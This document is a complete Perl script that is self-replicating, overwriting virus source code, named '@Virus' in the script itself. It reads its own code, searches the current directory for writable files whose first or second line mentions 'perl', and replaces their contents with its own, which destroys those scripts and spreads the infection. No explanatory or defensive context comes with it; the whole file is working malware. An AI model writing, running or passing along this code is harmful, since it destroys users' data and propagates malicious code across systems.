#!/usr/bin/perl
 open(File,$0);
 @Virus=<File>;
 close(File);

 foreach $FileName (<*>)
 {
  if ((-r $FileName) && (-w $FileName) && (-f $FileName))
  {
   open(File, "$FileName");
   @Temp=<File>;
   close(File);
   if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl"))
   {
    open(File, ">$FileName");
    print File @Virus;
    close (File);
   }
  }
 }

